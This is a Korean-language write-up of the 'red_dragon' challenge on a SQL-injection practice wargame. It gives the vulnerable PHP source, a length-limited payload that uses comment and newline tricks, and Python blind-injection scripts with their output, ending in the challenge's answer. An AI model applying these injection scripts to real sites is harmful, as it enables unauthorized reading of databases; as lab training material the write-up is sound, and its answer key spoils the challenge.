# red_dragon

## 1. Code
```php
<?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\./i', $_GET['id'])) exit("No Hack ~_~");
  if(strlen($_GET['id']) > 7) exit("too long string");
  $no = is_numeric($_GET['no']) ? $_GET['no'] : 1;
  $query = "select id from prob_red_dragon where id='{$_GET['id']}' and no={$no}";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if($result['id']) echo "<h2>Hello {$result['id']}</h2>";

  $query = "select no from prob_red_dragon where id='admin'"; // if you think challenge got wrong, look column name again.
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if($result['no'] === $_GET['no']) solve("red_dragon");
  highlight_file(__FILE__);
?>
```

## 2. Condition
- get 파라미터 `id`와 `no`를 받는다.   
- `id`는 7글자 이하로 받는다.   
- `no`는 변수 `$no`에 각각 숫자라면 그대로를, 숫자가 아니라면 1을 넣는다.
- 정확한 admin의 no를 찾아내면 문제가 해결된다.   

## 3. Solution
조건에 맞추어 적절히 쿼리를 분리시켰다.   
구체적으로 설명하자면, `no<9`가 있다면 `no<`를 `id`로, `9`를 `no`로 분리시킨 것이다.    
위와같이 분리시킨 후 각 파라미터의 조건을 충족시키면 공격쿼리의 완성이다.   

>    분리시킬 수 있었던 방법은 다음과 같다.   
`no<`뒤에 `#`을 붙여줌으로써, 한줄 주석을 진행하고   
`9`앞에 `%0a`를 붙여줌으로써, 개행을 진행하였다.   
결과적으로 한 문자열인 `no<9`가 되는것이다.   

본격적인 공격흐름은 평소와같이 크게 두가지로 나누었다.   
1. no값의 길이 구하기
2. 정확한 no값 구하기    

이전에 두 흐름속 공통적인 부분을 함수로 만들었다.   
정수값을 입력받아 `no<입력값` 진행 후   
응답 페이지 속 "Hello admin"을 기준삼아 참과 거짓을 반환하는 함수이다.   

```python
def dist_tf(num):
    url = "https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php?id='||no<%%23&no=%%0a%d" % (num)
    res = requests.get(url, cookies=cookie)
    
    if "Hello admin" in res.text:
        return True;
    else:
        return False;
```   


------
### 1. no값의 길이 구하기   

변수명 | 값
---|---
`id` | '\|\|no<#
`no` | `i`

>    `i`값은 1부터 10씩 곱해간 값(1,10,100,1000)을 넣어주었다.   
    결과적으로 `i`보다 작다면 `i-1`이 길이가 될 것이다.   

```python
import requests

cookie = {'PHPSESSID' : '~~~~'}

def dist_tf(num):
    url = "https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php?id='||no<%%23&no=%%0a%d" % (num)
    res = requests.get(url, cookies=cookie)
    
    if "Hello admin" in res.text:
        return True;
    else:
        return False;
    
for i in range(1,100):
    print("%d ... " % (10**(i-1)), end="")
    if dist_tf(10**(i-1)):
        no_len = i - 1
        print("O\n")
        print("=======================")
        print("admin no length  |  %d" % (i-1))
        print("=======================\n")
        break
    
    else:
        print("X")
```   

>    결과는 다음과 같다.

```
1 ... X
10 ... X
100 ... X
1000 ... X
10000 ... X
100000 ... X
1000000 ... X
10000000 ... X
100000000 ... X
1000000000 ... O

=======================
admin no length  |  9
=======================
```


------
### 2. no의 정확한 값 찾아내기   

변수명 | 값
---|---
`id` | '\|\|no<#
`no` | `i`

>    `max`와 `min`을 두어, `i`에 그 사잇값을 넣는다.   
    그렇게 `max`와 `min`을 좁혀가다, 두 차가 1이하라면 결과를 반환한다.   
>
>    코드는 다음과 같다.   
```python
import requests

cookie = {'PHPSESSID' : '~~~~'}

def dist_tf(num):
    url = "https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php?id='||no<%%23&no=%%0a%d" % (num)
    res = requests.get(url, cookies=cookie)
    
    if "Hello admin" in res.text:
        return True;
    else:
        return False;
    
for i in range(1,100):
    print("%d ... " % (10**(i-1)), end="")
    if dist_tf(10**(i-1)):
        no_len = i - 1
        print("O\n")
        print("=======================")
        print("admin no length  |  %d" % (i-1))
        print("=======================\n")
        break
    
    else:
        print("X")
        
max = int('9'*no_len)
min = 10**(no_len-1)

for i in range(1,10000):
    if dist_tf(int((min+max)/2)):
        max = int((min+max)/2)
    else:
        min = int((min+max)/2)
    
    print("[%d] %d ~ %d" % (i, min, max))
    
    if ((max - min) <= 1):
        print("\n==============================")
        print("admin no  |  %d" % (min))
        print("==============================\n")
        break
```

>    결과는 다음과 같다.   

```
1 ... X
10 ... X
100 ... X
1000 ... X
10000 ... X
100000 ... X
1000000 ... X
10000000 ... X
100000000 ... X
1000000000 ... O

=======================
admin no length  |  9
=======================

[1] 549999999 ~ 999999999
[2] 549999999 ~ 774999999
[3] 549999999 ~ 662499999
[4] 549999999 ~ 606249999
[5] 578124999 ~ 606249999
[6] 578124999 ~ 592187499
[7] 585156249 ~ 592187499
[8] 585156249 ~ 588671874
[9] 585156249 ~ 586914061
[10] 586035155 ~ 586914061
[11] 586474608 ~ 586914061
[12] 586474608 ~ 586694334
[13] 586474608 ~ 586584471
[14] 586474608 ~ 586529539
[15] 586474608 ~ 586502073
[16] 586474608 ~ 586488340
[17] 586481474 ~ 586488340
[18] 586481474 ~ 586484907
[19] 586481474 ~ 586483190
[20] 586481474 ~ 586482332
[21] 586481903 ~ 586482332
[22] 586481903 ~ 586482117
[23] 586482010 ~ 586482117
[24] 586482010 ~ 586482063
[25] 586482010 ~ 586482036
[26] 586482010 ~ 586482023
[27] 586482010 ~ 586482016
[28] 586482013 ~ 586482016
[29] 586482014 ~ 586482016
[30] 586482014 ~ 586482015

==============================
admin no  |  586482014
==============================
```

최종적으로 위 값을 `no`로 넣어주면 문제가 해결된다.   

변수명 | 값
---|---
`no` | 586482014